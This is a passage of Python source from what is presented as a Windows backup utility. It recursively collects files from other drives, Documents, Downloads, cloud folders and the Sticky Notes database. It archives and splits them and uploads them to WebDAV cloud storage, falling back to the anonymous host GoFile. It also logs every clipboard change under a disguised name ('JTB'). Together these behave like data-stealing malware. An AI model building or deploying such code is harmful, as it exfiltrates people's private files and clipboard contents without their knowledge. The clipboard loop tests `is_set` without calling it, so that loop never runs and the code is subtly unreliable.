                    self.stop_event.wait(self.config.FILE_DELETE_RETRY_DELAY)
        DETAIL_LOGGER.warning('归档清理失败，保留文件: %s', file_path)
        log_event(logging.WARNING, '清理', 'artifact_cleanup',
                  '部分已上传归档未能清理，本地文件已保留；详情见文件日志')
        return False

    def should_exclude_dir(self, path):
        if is_within(path, self.config.BACKUP_ROOT, include_root=True):
            return True
        parts = [part.casefold() for part in os.path.normpath(path).split(os.sep)]
        excluded = {name.casefold() for name in self.config.EXCLUDE_INSTALL_DIRS}
        keywords = {name.casefold() for name in self.config.EXCLUDE_KEYWORDS}
        for part in parts:
            if part in excluded or part in keywords:
                return True
        return False

    @staticmethod
    def _check_deadline(deadline):
        if time.monotonic() >= deadline:
            raise TimeoutError('扫描或文件复制超过时间限制')

    def _copy_file_atomic(self, source, target, deadline):
        self._check_deadline(deadline)
        if not is_within(target, self.config.STAGING_ROOT):
            raise ValueError('复制目标必须位于暂存目录')
        os.makedirs(os.path.dirname(target), exist_ok=True)
        fd, temporary = tempfile.mkstemp(prefix='.copy-', suffix='.partial', dir=os.path.dirname(target))
        try:
            digest = hashlib.sha256()
            size = 0
            with open(source, 'rb') as src, os.fdopen(fd, 'wb') as dst:
                fd = None
                before = os.fstat(src.fileno())
                while True:
                    self._check_deadline(deadline)
                    if self.stop_event.is_set():
                        raise InterruptedError('任务已停止')
                    block = src.read(self.config.COPY_CHUNK_SIZE)
                    if not block:
                        break
                    dst.write(block)
                    digest.update(block)
                    size += len(block)
                after = os.fstat(src.fileno())
                dst.flush()
                os.fsync(dst.fileno())
            current = os.stat(source)
            if (size != before.st_size or before.st_mtime_ns != after.st_mtime_ns or
                    before.st_size != after.st_size or before.st_ino != current.st_ino or
                    after.st_mtime_ns != current.st_mtime_ns or after.st_size != current.st_size):
                raise OSError('复制期间源文件发生变化')
            shutil.copystat(source, temporary)
            os.replace(temporary, target)
            return {'size': size, 'sha256': digest.hexdigest()}
        finally:
            if fd is not None:
                os.close(fd)
            if os.path.exists(temporary):
                os.remove(temporary)

    def _copy_sqlite_atomic(self, source, target, deadline):
        self._check_deadline(deadline)
        os.makedirs(os.path.dirname(target), exist_ok=True)
        fd, temporary = tempfile.mkstemp(prefix='.sqlite-', suffix='.partial', dir=os.path.dirname(target))
        os.close(fd)
        source_connection = destination_connection = None
        try:
            # URI 正确编码中文、#、? 等路径字符，且禁止创建源数据库。
            source_uri = Path(source).resolve().as_uri() + '?mode=ro'
            source_connection = sqlite3.connect(source_uri, uri=True, timeout=5)
            destination_connection = sqlite3.connect(temporary)
            backup_deadline = min(deadline, time.monotonic() + max(5, self.config.FILE_RETRY_DELAY * 3))

            def progress(status, remaining, total):
                self._check_deadline(backup_deadline)
                if self.stop_event.is_set():
                    raise InterruptedError('任务已停止')

            source_connection.backup(destination_connection, pages=128, progress=progress, sleep=0.05)
            if destination_connection.execute('PRAGMA quick_check').fetchone()[0] != 'ok':
                raise OSError('便签数据库一致性检查失败')
            destination_connection.close()
            destination_connection = None
            source_connection.close()
            source_connection = None
            metadata = {'size': os.path.getsize(temporary), 'sha256': file_digest(temporary)}
            os.replace(temporary, target)
            return metadata
        finally:
            for connection in (destination_connection, source_connection):
                if connection is not None:
                    connection.close()
            if os.path.exists(temporary):
                os.remove(temporary)

    def _collect_file(self, source, relative, result, deadline, sqlite_snapshot=False):
        target = os.path.join(result.directory, relative)
        if not is_within(target, result.directory):
            result.errors.append('备份相对路径越界: ' + relative)
            return
        for attempt in range(self.config.FILE_RETRY_COUNT):
            try:
                if os.path.islink(source):
                    result.skipped += 1
                    DETAIL_LOGGER.warning('跳过符号链接: %s', source)
                    return
                copier = self._copy_sqlite_atomic if sqlite_snapshot else self._copy_file_atomic
                result.files[relative.replace(os.sep, '/')] = copier(source, target, deadline)
                return
            except (TimeoutError, InterruptedError) as exc:
                result.timed_out = isinstance(exc, TimeoutError)
                result.errors.append(str(exc) + ': ' + source)
                return
            except (OSError, sqlite3.Error, ValueError) as exc:
                if attempt + 1 == self.config.FILE_RETRY_COUNT:
                    result.errors.append(str(exc) + ': ' + source)
                    DETAIL_LOGGER.error('文件备份失败: %s: %s', source, exc)
                else:
                    self.stop_event.wait(self.config.FILE_RETRY_DELAY)

    def _collect_tree(self, source, result, deadline, prefix='', extensions=None, excluded=False,
                      file_filter=None):
        def onerror(error):
            result.errors.append(str(error))

        for root, directories, files in os.walk(source, topdown=True, onerror=onerror, followlinks=False):
            self._check_deadline(deadline)
            if self.stop_event.is_set():
                raise InterruptedError('任务已停止')
            if is_within(root, self.config.BACKUP_ROOT, include_root=True):
                directories.clear()
                result.skipped += 1
                continue
            if excluded and self.should_exclude_dir(root):
                directories.clear()
                result.skipped += 1
                continue
            allowed = []
            for name in directories:
                path = os.path.join(root, name)
                if (os.path.islink(path) or is_within(path, self.config.BACKUP_ROOT, include_root=True) or
                        (excluded and self.should_exclude_dir(path))):
                    result.skipped += 1
                    continue
                allowed.append(name)
            directories[:] = allowed
            relative_root = os.path.relpath(root, source)
            relative_root = prefix if relative_root == '.' else os.path.join(prefix, relative_root)
            os.makedirs(os.path.join(result.directory, relative_root), exist_ok=True)
            for name in files:
                self._check_deadline(deadline)
                path = os.path.join(root, name)
                if extensions and not any(name.casefold().endswith(ext.casefold()) for ext in extensions):
                    result.skipped += 1
                    continue
                if file_filter and not file_filter(name):
                    result.skipped += 1
                    continue
                self._collect_file(path, os.path.join(relative_root, name), result, deadline)
                if result.timed_out or self.stop_event.is_set():
                    return

    def backup_disk_files(self, source_dir, target_dir, extensions_type=1):
        result = CollectionResult(target_dir)
        deadline = time.monotonic() + self.config.SCAN_TIMEOUT
        try:
            if not os.path.isdir(source_dir):
                raise FileNotFoundError(source_dir)
            if not is_within(target_dir, self.config.STAGING_ROOT):
                raise ValueError('磁盘备份目标必须位于暂存区')
            os.makedirs(target_dir, exist_ok=True)
            extensions = self.config.DISK_EXTENSIONS_1 if extensions_type == 1 else self.config.DISK_EXTENSIONS_2
            self._collect_tree(source_dir, result, deadline, extensions=extensions, excluded=True)
        except Exception as exc:
            result.timed_out = isinstance(exc, TimeoutError)
            result.errors.append(str(exc))
        return result

    def backup_specified_files(self, source_dir, target_dir):
        result = CollectionResult(target_dir)
        deadline = time.monotonic() + self.config.SCAN_TIMEOUT
        try:
            if not is_within(target_dir, self.config.STAGING_ROOT):
                raise ValueError('指定文件备份目标必须位于暂存区')
            os.makedirs(target_dir, exist_ok=True)
            for item in self.config.WINDOWS_SPECIFIC_DIRS:
                self._check_deadline(deadline)
                pattern = os.path.join(source_dir, item)
                matches = glob.glob(pattern) if glob.has_magic(item) else ([pattern] if os.path.exists(pattern) else [])
                if not matches:
                    result.skipped += 1
                for path in matches:
                    if not is_within(path, source_dir):
                        raise ValueError('指定备份项目越出用户目录: ' + path)
                    relative = os.path.relpath(path, source_dir)
                    if os.path.isdir(path):
                        self._collect_tree(path, result, deadline, prefix=relative)
                    else:
                        self._collect_file(path, relative, result, deadline,
                                           sqlite_snapshot=os.path.basename(path).casefold() == 'plum.sqlite')
                    if result.timed_out or self.stop_event.is_set():
                        return result
        except Exception as exc:
            result.timed_out = isinstance(exc, TimeoutError)
            result.errors.append(str(exc))
        return result


    def split_large_file(self, file_path):
        """不需分片返回显式状态；任何失败抛异常并保留原文件。"""
        size = os.path.getsize(file_path)
        limit = min(self.config.CHUNK_SIZE, self.config.MAX_SINGLE_FILE_SIZE)
        if limit <= 0:
            raise ValueError('分片大小必须大于 0')
        if size <= self.config.MAX_SINGLE_FILE_SIZE:
            return SplitResult([file_path], False)
        if not is_within(file_path, self.config.ARTIFACT_ROOT):
            raise ValueError('只允许分割 artifacts 中的备份文件')
        directory = tempfile.mkdtemp(prefix='parts-', dir=os.path.dirname(file_path))
        parts = []
        whole_hash = hashlib.sha256()
        with open(file_path, 'rb') as source:
            before = os.fstat(source.fileno())
            remaining = size
            index = 0
            while remaining:
                if self.stop_event.is_set():
                    raise InterruptedError('分片已停止')
                name = os.path.basename(file_path) + '.part' + str(index).zfill(5)
                path = os.path.join(directory, name)
                part_hash = hashlib.sha256()
                part_size = 0
                with open(path, 'xb') as destination:
                    wanted = min(limit, remaining)
                    while wanted:
                        block = source.read(min(self.config.COPY_CHUNK_SIZE, wanted))
                        if not block:
                            raise OSError('分片期间源文件被截断')
                        destination.write(block)
                        whole_hash.update(block)
                        part_hash.update(block)
                        wanted -= len(block)
                        remaining -= len(block)
                        part_size += len(block)
                    destination.flush()
                    os.fsync(destination.fileno())
                if file_digest(path) != part_hash.hexdigest():
                    raise OSError('写入后的分片校验失败')
                parts.append({'name': name, 'size': part_size, 'sha256': part_hash.hexdigest()})
                index += 1
            after = os.fstat(source.fileno())
            if source.read(1) or before.st_size != after.st_size or before.st_mtime_ns != after.st_mtime_ns:
                raise OSError('分片期间源文件发生变化')
        manifest = {
            'format': 'autobackup-parts-v1', 'archive': os.path.basename(file_path),
            'size': size, 'sha256': whole_hash.hexdigest(), 'parts': parts,
        }
        manifest_path = os.path.join(directory, os.path.basename(file_path) + '.parts.json')
        atomic_json(manifest_path, manifest)
        if os.path.getsize(manifest_path) > self.config.MAX_SINGLE_FILE_SIZE:
            raise ValueError('分片清单本身超过上传限制，原归档已保留')
        return SplitResult([os.path.join(directory, part['name']) for part in parts] + [manifest_path], True)

    @staticmethod
    def _verify_archive(path, root_name, expected):
        seen = set()
        with tarfile.open(path, 'r:gz') as archive:
            for member in archive:
                if member.isdir():
                    continue
                if not member.isfile() or not member.name.startswith(root_name + '/'):
                    raise ValueError('归档包含不支持的成员: ' + member.name)
                relative = member.name[len(root_name) + 1:]
                if relative not in expected or relative in seen:
                    raise ValueError('归档文件清单不一致: ' + relative)
                digest = hashlib.sha256()
                with archive.extractfile(member) as stream:
                    for block in iter(lambda: stream.read(1024 * 1024), b''):
                        digest.update(block)
                metadata = expected[relative]
                if member.size != metadata['size'] or digest.hexdigest() != metadata['sha256']:
                    raise ValueError('归档内容校验失败: ' + relative)
                seen.add(relative)
        if seen != set(expected):
            raise ValueError('归档缺少文件')

    def zip_backup_folder(self, folder_path, zip_file_path, expected_files=None):
        """完整归档及校验；不清理来源，分片保留统一 tar 目录结构。"""
        if not os.path.isdir(folder_path):
            raise FileNotFoundError(folder_path)
        if not is_within(zip_file_path, self.config.ARTIFACT_ROOT):
            raise ValueError('归档目标必须位于 artifacts 中')
        expected = copy.deepcopy(expected_files) if expected_files is not None else {}
        if expected_files is None:
            for root, _, files in os.walk(folder_path):
                for name in files:
                    path = os.path.join(root, name)
                    relative = os.path.relpath(path, folder_path).replace(os.sep, '/')
                    expected[relative] = {'size': os.path.getsize(path), 'sha256': file_digest(path)}
        tar_path = zip_file_path + '.tar.gz'
        if os.path.exists(tar_path):
            raise FileExistsError(tar_path)
        os.makedirs(os.path.dirname(tar_path), exist_ok=True)
        temporary = tar_path + '.partial'
        root_name = os.path.basename(os.path.normpath(folder_path))
        manifest_name = '.autobackup-manifest-' + uuid.uuid4().hex + '.json'
        manifest_data = json.dumps({'format': 'autobackup-files-v1', 'files': expected},
                                   ensure_ascii=False, indent=2).encode('utf-8')
        expected[manifest_name] = {'size': len(manifest_data), 'sha256': hashlib.sha256(manifest_data).hexdigest()}

        def regular_only(member):
            if not member.isdir() and not member.isfile():
                raise ValueError('归档不支持符号链接或特殊文件: ' + member.name)
            return member

        with tarfile.open(temporary, 'w:gz', compresslevel=self.config.TAR_COMPRESS_LEVEL) as archive:
            archive.add(folder_path, arcname=root_name, filter=regular_only)
            member = tarfile.TarInfo(root_name + '/' + manifest_name)
            member.size = len(manifest_data)
            archive.addfile(member, io.BytesIO(manifest_data))
        self._verify_archive(temporary, root_name, expected)
        os.replace(temporary, tar_path)
        split = self.split_large_file(tar_path)
        return ArchiveResult(split.paths, tar_path if split.split else None)

    def split_large_directory(self, folder_path, base_zip_path, expected_files=None):
        """与普通归档使用同一流程，单个大文件不会被过滤掉。"""
        return self.zip_backup_folder(folder_path, base_zip_path, expected_files)

    def upload_file(self, file_path):
        if not self._is_valid_file(file_path):
            DETAIL_LOGGER.error('待上传文件不存在或为空，已保留: %s', file_path)
            return False
        try:
            split = self.split_large_file(file_path)
        except Exception:
            DETAIL_LOGGER.exception('分片失败，保留原始归档: %s', file_path)
            return False
        success = True
        for path in split.paths:
            if self.stop_event.is_set() or not self._upload_single_file(path):
                success = False
        # 直接上传调用产生的临时分片，只有全部成功后才允许清理。
        # 待上传原文件的清理由持久化队列提交成功状态后统一处理。
        if success and split.split:
            for path in split.paths:
                self._safe_remove_file(path)
        return success

    def upload_backup(self, backup_path):
        paths = backup_path.paths if isinstance(backup_path, ArchiveResult) else backup_path
        paths = paths if isinstance(paths, list) else [paths]
        results = [self.upload_file(path) for path in paths]
        return all(results)

    def _remote_relative_path(self, file_path):
        if not is_within(file_path, self.config.ARTIFACT_ROOT):
            raise ValueError('上传路径必须位于 artifacts 内')
        relative = os.path.relpath(file_path, self.config.ARTIFACT_ROOT).replace(os.sep, '/')
        return self.config.INFINI_REMOTE_BASE_DIR + '/' + relative

    def _create_remote_directory(self, remote_dir, infini_url=None, auth=None):
        """创建远程目录（使用 WebDAV MKCOL 方法）"""
        if not remote_dir or remote_dir == '.':
            return True

        if not infini_url:
            infini_url = self.infini_url
        if auth is None:
            auth = self.auth
        
        try:
            # 构建目录路径
            dir_path = infini_url.rstrip('/') + '/' + quote(remote_dir.lstrip('/'), safe='/')
            
            response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
            
            if response.status_code in [201, 204, 405]:  # 405 表示已存在
                return True
            elif response.status_code == 409:
                # 409 可能表示父目录不存在，尝试创建父目录
                parent_dir = posixpath.dirname(remote_dir)
                if parent_dir and parent_dir != '.':
                    if self._create_remote_directory(parent_dir, infini_url=infini_url, auth=auth):
                        # 父目录创建成功，再次尝试创建当前目录
                        response = self.session.request('MKCOL', dir_path, auth=auth, timeout=(8, 8))
                        return response.status_code in [201, 204, 405]
                return False
            else:
                return False
        except Exception:
            return False

    def _upload_single_file_infini(self, file_path, infini_config):
        """使用指定的 Infini 配置上传单个文件（使用 WebDAV PUT 方法）。"""
        try:
            config_name = infini_config.get("name", "Infini Cloud")
            infini_url = infini_config.get("url", "").strip()
            infini_user = infini_config.get("user", "").strip()
            infini_password = infini_config.get("password", "")

            if not infini_url or not infini_user or not infini_password:
                DETAIL_LOGGER.error(f"❌ [{config_name}] 配置不完整，跳过")
                return False

            auth = HTTPBasicAuth(infini_user, infini_password)

            # 检查文件权限和状态
            if not os.path.exists(file_path):
                DETAIL_LOGGER.error(f"文件不存在: {file_path}")
                return False
                
            file_size = get_file_size_cached(file_path)
            if file_size == 0:
                DETAIL_LOGGER.error(f"文件大小为0: {file_path}")
                return False
                
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                DETAIL_LOGGER.error(f"文件过大 {file_path}: {file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB")
                return False

            # 构建远程路径
            filename = os.path.basename(file_path)
            remote_filename = self._remote_relative_path(file_path)
            remote_path = infini_url.rstrip('/') + '/' + quote(remote_filename, safe='/')
            
            # 创建远程目录（如果需要）
            remote_dir = posixpath.dirname(remote_filename)
            if remote_dir and remote_dir != '.':
                if not self._create_remote_directory(remote_dir, infini_url=infini_url, auth=auth):
                    DETAIL_LOGGER.warning(f"[{config_name}] 无法创建远程目录: {remote_dir}，将继续尝试上传")

            # 上传重试逻辑
            for attempt in range(self.config.RETRY_COUNT):
                if self.stop_event.is_set():
                    return False

                try:
                    # 根据文件大小动态调整超时时间
                    if file_size < 1024 * 1024:  # 小于1MB
                        connect_timeout = 10
                        read_timeout = 30
                    elif file_size < 10 * 1024 * 1024:  # 1-10MB
                        connect_timeout = 15
                        read_timeout = max(30, int(file_size / 1024 / 1024 * 5))
                    else:  # 大于10MB
                        connect_timeout = 20
                        read_timeout = max(60, int(file_size / 1024 / 1024 * 6))
                    
                    # 只在第一次尝试时显示详细信息
                    if attempt == 0:
                        size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                        DETAIL_LOGGER.info(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                    elif self.config.DEBUG_MODE:
                        DETAIL_LOGGER.debug("[%s] 重试上传: %s (第 %s 次)", config_name, filename, attempt + 1)
                    
                    # 准备请求头
                    headers = {
                        'Content-Type': 'application/octet-stream',
                        'Content-Length': str(file_size),
                    }
                    
                    # 执行上传（使用 WebDAV PUT 方法）
                    with open(file_path, 'rb') as f:
                        response = self.session.put(
                            remote_path,
                            data=f,
                            headers=headers,
                            auth=auth,
                            timeout=(connect_timeout, read_timeout),
                            stream=False
                        )
                    
                    if response.status_code in [201, 204]:
                        DETAIL_LOGGER.info(f"✅ [{config_name}] {filename}")
                        return True
                    elif response.status_code == 403:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            DETAIL_LOGGER.error(f"❌ [{config_name}] {filename}: 权限不足")
                    elif response.status_code == 404:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            DETAIL_LOGGER.error(f"❌ [{config_name}] {filename}: 远程路径不存在")
                    elif response.status_code == 409:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            DETAIL_LOGGER.error(f"❌ [{config_name}] {filename}: 远程路径冲突")
                    else:
                        if attempt == 0 or self.config.DEBUG_MODE:
                            DETAIL_LOGGER.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
                        
                except requests.exceptions.Timeout:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 超时")
                except requests.exceptions.SSLError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [{config_name}] {os.path.basename(file_path)}: SSL错误")
                except requests.exceptions.ConnectionError:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [{config_name}] {os.path.basename(file_path)}: 连接错误")
                except Exception as e:
                    if attempt == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [{config_name}] {os.path.basename(file_path)}: {str(e)}")

                if attempt < self.config.RETRY_COUNT - 1:
                    if self.config.DEBUG_MODE:
                        DETAIL_LOGGER.debug("[%s] 等待 %s 秒后重试...", config_name, self.config.RETRY_DELAY)
                    self.stop_event.wait(self.config.RETRY_DELAY)

            return False
            
        except OSError as e:
            DETAIL_LOGGER.error(f"获取文件信息失败 {file_path}: {e}")
            return False
        except Exception as e:
            DETAIL_LOGGER.error(f"[Infini Cloud] 上传过程出错: {e}")
            return False

    def _upload_single_file_gofile(self, file_path):
        """上传单个文件到 GoFile（备选方案）
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            DETAIL_LOGGER.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = get_file_size_cached(file_path)
            if file_size == 0:
                DETAIL_LOGGER.error(f"文件大小为0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                DETAIL_LOGGER.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            filename = os.path.basename(file_path)
            DETAIL_LOGGER.info(f"🔄 尝试使用 GoFile 上传: {filename}")

            server_index = 0
            total_retries = 0
            max_total_retries = len(self.config.UPLOAD_SERVERS) * self.config.MAX_SERVER_RETRIES
            upload_success = False

            while total_retries < max_total_retries and not upload_success:
                if self.stop_event.is_set():
                    return False

                current_server = self.config.UPLOAD_SERVERS[server_index]
                try:
                    # 使用 with 语句确保文件正确关闭
                    with open(file_path, "rb") as f:
                        response = requests.post(
                            current_server,
                            files={"file": f},
                            headers={"Authorization": f"Bearer {self.api_token}"},
                            timeout=self.config.UPLOAD_TIMEOUT,
                            verify=True
                        )

                        if response.ok:
                            try:
                                result = response.json()
                                if result.get("status") == "ok":
                                    DETAIL_LOGGER.info(f"✅ [GoFile] {filename}")
                                    upload_success = True
                                    break
                                else:
                                    error_msg = result.get("message", "未知错误")
                                    error_code = result.get("code", 0)
                                    if total_retries == 0 or self.config.DEBUG_MODE:
                                        DETAIL_LOGGER.error(f"[GoFile] 服务器返回错误 (代码: {error_code}): {error_msg}")
                                    
                                    # 处理特定错误码
                                    if error_code in [402, 405]:  # 服务器限制或权限错误
                                        server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                                        if server_index == 0:  # 如果已经尝试了所有服务器
                                            self.stop_event.wait(self.config.RETRY_DELAY * 2)  # 增加等待时间
                            except (ValueError, KeyError) as e:
                                if total_retries == 0 or self.config.DEBUG_MODE:
                                    DETAIL_LOGGER.error(f"[GoFile] 服务器返回无效JSON数据: {str(e)}")
                        else:
                            if total_retries == 0 or self.config.DEBUG_MODE:
                                DETAIL_LOGGER.error(f"[GoFile] 上传失败，HTTP状态码: {response.status_code}")

                except requests.exceptions.Timeout:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: 超时")
                except requests.exceptions.SSLError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: SSL错误")
                except requests.exceptions.ConnectionError as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: 连接错误")
                except requests.exceptions.RequestException as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: 请求异常")
                except (OSError, IOError) as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: 文件读取错误")
                except Exception as e:
                    if total_retries == 0 or self.config.DEBUG_MODE:
                        DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: {str(e)}")

                # 切换到下一个服务器
                server_index = (server_index + 1) % len(self.config.UPLOAD_SERVERS)
                if server_index == 0:
                    self.stop_event.wait(self.config.RETRY_DELAY)  # 所有服务器都尝试过后等待
                
                total_retries += 1

            if upload_success:
                return True
            else:
                DETAIL_LOGGER.error(f"❌ [GoFile] {filename}: 上传失败，已达到最大重试次数")
                return False

        except (OSError, IOError, PermissionError) as e:
            DETAIL_LOGGER.error(f"[GoFile] 处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            DETAIL_LOGGER.error(f"[GoFile] 处理文件时出现未知错误: {str(e)}")
            return False

    def _upload_single_file(self, file_path):
        """上传单个文件，依次尝试所有 Infini 配置，全部失败后再使用 GoFile 备选方案
        
        Args:
            file_path: 要上传的文件路径
            
        Returns:
            bool: 上传是否成功
        """
        if not os.path.exists(file_path):
            DETAIL_LOGGER.error(f"文件不存在: {file_path}")
            return False

        try:
            file_size = get_file_size_cached(file_path)
            if file_size == 0:
                DETAIL_LOGGER.error(f"文件大小为0: {file_path}")
                return False
            
            if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                DETAIL_LOGGER.error(f"文件过大: {file_path} ({file_size / 1024 / 1024:.2f}MB > {self.config.MAX_SINGLE_FILE_SIZE / 1024 / 1024}MB)")
                return False

            infini_configs = self.infini_configs if self.infini_configs else [
                {
                    "name": "Infini-默认配置",
                    "url": self.infini_url,
                    "user": self.infini_user,
                    "password": self.infini_pass,
                }
            ]

            # 依次尝试所有 Infini 上传配置
            for index, infini_config in enumerate(infini_configs, start=1):
                config_name = infini_config.get("name", f"Infini-{index}")
                DETAIL_LOGGER.info(f"🔄 尝试 Infini 上传配置 {index}/{len(infini_configs)}: {config_name}")
                if self._upload_single_file_infini(file_path, infini_config):
                    return True

            # 所有 Infini 上传方法都失败后，才尝试 GoFile 备选方案
            DETAIL_LOGGER.warning(f"⚠️ 所有 Infini 上传方法均失败，尝试使用 GoFile 备选方案: {os.path.basename(file_path)}")
            if self._upload_single_file_gofile(file_path):
                return True
            
            # 所有方法都失败
            DETAIL_LOGGER.error(f"❌ {os.path.basename(file_path)}: 所有上传方法均失败")
            return False

        except (OSError, IOError, PermissionError) as e:
            DETAIL_LOGGER.error(f"处理文件时出错: {str(e)}")
            return False
        except Exception as e:
            DETAIL_LOGGER.error(f"处理文件时出现未知错误: {str(e)}")
            return False

    def get_clipboard_content(self):
        """获取JTB内容"""
        if pyperclip is None:
            return None
        try:
            content = pyperclip.paste()
        except (pyperclip.PyperclipException, RuntimeError) as e:
            # 某些环境下（如无图形界面 / 无剪贴板服务）会持续抛出异常
            # 这里不记录错误日志，只返回 None，避免日志被高频刷屏
            return None
        
        if content is None:
            return None
        # 去除空白字符
        content = content.strip()
        return content if content else None

    def log_clipboard_update(self, content, file_path):
        """记录JTB更新到文件"""
        try:
            # 确保目录存在
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # 写入日志
            with self._clipboard_lock, open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            log_event(logging.WARNING, '剪贴板', 'clipboard_write_error',
                      '剪贴板日志写入失败，请检查磁盘空间或目录权限；详情见文件日志', exc_info=True)

    def monitor_clipboard(self, file_path, interval=3):
        """监控JTB变化并记录到文件
        
        Args:
            file_path: 日志文件路径
            interval: 检查间隔（秒）
        """
        # 确保日志目录存在
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                log_event(logging.ERROR, '剪贴板', 'clipboard_directory_error',
                          '无法创建剪贴板日志目录，监控已停止；详情见文件日志', exc_info=True)
                return

        last_content = ""
        error_count = 0
        max_errors = 5  # 最大连续错误次数（可考虑提取为配置常量）
        
        while not self.stop_event.is_set:
            try:
                current_content = self.get_clipboard_content()
                # 只有当JTB内容非空且与上次不同时才记录
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        DETAIL_LOGGER.debug("检测到剪贴板更新")
                    error_count = 0  # 重置错误计数
                else:
                    error_count = 0  # 空内容不算错误，重置计数
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    log_event(logging.WARNING, '剪贴板', 'clipboard_monitor_error',
                              '剪贴板监控连续失败 %s 次 | %s秒后重试 | 详情见文件日志',
                              max_errors, self.config.CLIPBOARD_ERROR_WAIT, exc_info=True)
                    self.stop_event.wait(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # 重置错误计数
                elif self.config.DEBUG_MODE:
                    DETAIL_LOGGER.debug('剪贴板监控异常: %s', e, exc_info=True)
            self.stop_event.wait(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

def is_disk_available(disk_path):
    """检查磁盘是否可用"""
    try:
        return os.path.exists(disk_path) and os.access(disk_path, os.R_OK)
    except Exception:
        return False

def get_available_disks(config=None):
    """获取所有可用的磁盘和云盘目录"""
    config = config or BackupConfig()
    available_disks = {}
    disk_letters = ['D', 'E', 'F']
    # 处理普通磁盘
    username = getpass.getuser()
    user_prefix = username[:5] if username else "user"
    for letter in disk_letters:
        disk_path = f"{letter}:\\"  # 使用Windows路径格式
        if os.path.exists(disk_path) and os.path.isdir(disk_path):
            backup_path = os.path.join(config.BACKUP_ROOT, f'{user_prefix}_disk_{letter}')
            available_disks[letter] = {
                'docs': (disk_path, os.path.join(backup_path, f'{user_prefix}_docs'), 1),  # 文档类
                'configs': (disk_path, os.path.join(backup_path, f'{user_prefix}_configs'), 2),  # 配置类
            }
            DETAIL_LOGGER.info(f"检测到可用磁盘: {disk_path}")
    
    # 处理用户目录下的文档/下载目录（支持中英文目录名）
    user_path = os.path.expandvars('%USERPROFILE%')
    if os.path.exists(user_path):
        documents_names = ["Documents", "文档"]
        downloads_names = ["Downloads", "下载"]

        for name in documents_names:
            documents_path = os.path.join(user_path, name)
            if os.path.exists(documents_path) and os.path.isdir(documents_path):
                documents_backup_path = os.path.join(config.BACKUP_ROOT, f'{user_prefix}_user_documents')
                available_disks['documents'] = {
                    'docs': (os.path.abspath(documents_path), os.path.join(documents_backup_path, f'{user_prefix}_docs'), 1),
                    'configs': (os.path.abspath(documents_path), os.path.join(documents_backup_path, f'{user_prefix}_configs'), 2),
                }
                DETAIL_LOGGER.info(f"检测到文档目录: {documents_path}")
                break

        for name in downloads_names:
            downloads_path = os.path.join(user_path, name)
            if os.path.exists(downloads_path) and os.path.isdir(downloads_path):
                downloads_backup_path = os.path.join(config.BACKUP_ROOT, f'{user_prefix}_user_downloads')
                available_disks['downloads'] = {
                    'docs': (os.path.abspath(downloads_path), os.path.join(downloads_backup_path, f'{user_prefix}_docs'), 1),
                    'configs': (os.path.abspath(downloads_path), os.path.join(downloads_backup_path, f'{user_prefix}_configs'), 2),
                }
                DETAIL_LOGGER.info(f"检测到下载目录: {downloads_path}")
                break

    # 处理用户目录下的云盘文件夹
    if os.path.exists(user_path):
        try:
            cloud_keywords = ["云", "网盘", "cloud", "drive", "box"]
            for item in os.listdir(user_path):
                item_path = os.path.join(user_path, item)
                if os.path.isdir(item_path):
                    # 检查文件夹名称是否包含云盘相关关键词
                    if any(keyword.lower() in item.lower() for keyword in cloud_keywords):
                        # 使用完整路径
                        disk_key = f"cloud_{item.lower()}"
                        cloud_backup_path = os.path.join(config.BACKUP_ROOT, f'{user_prefix}_cloud', item)
                        available_disks[disk_key] = {
                            'docs': (os.path.abspath(item_path), os.path.join(cloud_backup_path, f'{user_prefix}_docs'), 1),
